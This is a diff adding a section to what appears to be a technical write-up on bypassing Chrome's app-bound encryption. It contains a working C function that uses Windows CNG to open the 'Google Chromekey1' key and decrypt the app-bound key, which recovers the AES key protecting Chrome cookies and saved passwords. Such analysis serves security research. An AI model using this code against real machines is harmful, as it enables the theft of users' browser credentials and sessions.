@@ -731,3 +731,51 @@ Finally, BCryptDecrypt is used to both decrypt and verify integrity. If the auth
 
 The decryption is performed in-place, meaning the ciphertext buffer is overwritten with plaintext, which may be unsafe if authentication fails.`
 
+### DecryptUsingChromeKey
+
+```php
+BOOLEAN DecryptUsingChromeKey(_In_ PUCHAR Ciphertext)
+{
+    NCRYPT_PROV_HANDLE ProviderHandle;
+    NCRYPT_KEY_HANDLE  KeyHandle;
+    ULONG              BytesDecrypted;
+    SECURITY_STATUS    Status;
+
+
+    Status = NCryptOpenStorageProvider(&ProviderHandle, L"Microsoft Software Key Storage Provider", 0);
+
+    if (Status != ERROR_SUCCESS)
+    {
+        wprintf(L"Could not open key storage provider: 0x%08lX\n", Status);
+        return FALSE;
+    }
+
+
+
+    Status = NCryptOpenKey(ProviderHandle, &KeyHandle, L"Google Chromekey1", 0, 0);
+
+    if (Status != ERROR_SUCCESS)
+    {
+        wprintf(L"Could not open the Google Chromekey1 key: 0x%08lX\n", Status);
+        NCryptFreeObject(ProviderHandle);
+        return FALSE;
+    }
+
+
+
+    Status = NCryptDecrypt(KeyHandle, Ciphertext, 32, 0, Ciphertext, 32, &BytesDecrypted, NCRYPT_SILENT_FLAG);
+    NCryptFreeObject(KeyHandle);
+    NCryptFreeObject(ProviderHandle);
+
+    if (Status != ERROR_SUCCESS)
+    {
+        wprintf(L"Failed decrypting the app-bound key using the Chromekey1 key: 0x%08lX\n", Status);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+```
+
+
+`This function uses Windows CNG APIs to retrieve the Chrome-specific key (Google Chromekey1) from the Microsoft Software Key Storage Provider and uses it to decrypt a 32-byte app-bound encrypted key in-place. This step effectively recovers the raw AES key used by Chrome to protect sensitive data such as cookies and saved passwords.`
